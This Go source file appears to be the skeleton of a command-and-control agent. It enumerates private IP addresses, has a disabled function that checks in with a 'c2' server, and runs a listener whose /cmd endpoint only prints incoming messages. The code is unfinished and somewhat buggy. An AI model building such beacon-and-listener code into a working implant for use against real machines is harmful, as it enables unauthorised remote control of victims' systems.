package main

import (
	"flag"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
)

func findLocalAddress(ips []net.IP) []string {
	//192.168.0.?
	//10.?.?.?
	var LocalIps []string
	for _, ip := range ips {
		ipStr := ip.String()
		octet_array := strings.Split(ipStr, ".")
		for i, octet := range octet_array {
			octet_int, _ := strconv.Atoi(octet)
			if octet_int == 192 {
				octet_int_two, _ := strconv.Atoi(octet_array[i+1])
				octet_int_three, _ := strconv.Atoi(octet_array[i+2])
				if octet_int_two == 168 && octet_int_three == 0 {
					LocalIps = append(LocalIps, ipStr)
					break
				}
			}
			if octet_int == 10 {
				LocalIps = append(LocalIps, ipStr)
			}

			// if private_net_type == 0 {
			// 	if octet_int == 192 {
			// 		private_net_type = 192
			// 	} else if octet_int == 10 {
			// 		private_net_type = 10
			// 	}else{
			// 		break
			// 	}
			// }else if private_net_type == 192{
			// 	if octet_int == 168{
			// 		octet_int_next,_ := strconv.Atoi(octet_array[i+1])
			// 	}

		}

	}
	return LocalIps
}

func GetIPs() []net.IP {
	ifaces, _ := net.Interfaces()
	var ips []net.IP
	// handle err
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		// handle err
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip)
			//fmt.Println(ip)
			//fmt.Println(addrs) read ip with mask

		}
	}
	return ips
}

// port - 1234
func main() {
	//ip_addr := flag.String("ip", "localhost", "ip addres of c2")
	//endpoint := flag.String("endpoint", "", "endpoint c2")

	flag.Parse()

	//sendReadySignal(ip_addr)
	ip := GetIPs()
	fmt.Println(ip)
	fmt.Println(findLocalAddress(ip))
}
func sendReadySignal(ip *string) {
	c2_addr := "http://" + *ip + ":1234/ready"

	fmt.Printf(c2_addr)
	fmt.Printf("\n")

	body := strings.NewReader(`
	{
		"ip":"localhost:5555"
	}
	`)
	resp, err := http.Post(c2_addr, "application/json", body)
	if err != nil {
		fmt.Printf("Error with post request")
	}
	defer resp.Body.Close()
	fmt.Printf("Status: " + resp.Status)
	/*
		var jsonData = []byte(`{
			"ip":"localhost:5555"
		}`)
			request, error := http.NewRequest("POST", c2_addr, bytes.NewBuffer(jsonData))
			request.Header.Set("Content-Type", "application/json; charset=UTF-8")

			client := &http.Client{}
			response, error := client.Do(request)
			if error != nil {
				panic(error)
			}
			defer response.Body.Close()

			fmt.Println("response Status:", response.Status)
			fmt.Println("response Headers:", response.Header)
			body, _ := ioutil.ReadAll(response.Body)
			fmt.Println("response Body:", string(body))
	*/
	go startServer()

}
func startServer() {
	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf(r.URL.Query().Get("m"))
	})

	http.ListenAndServe(":5555", nil)
}
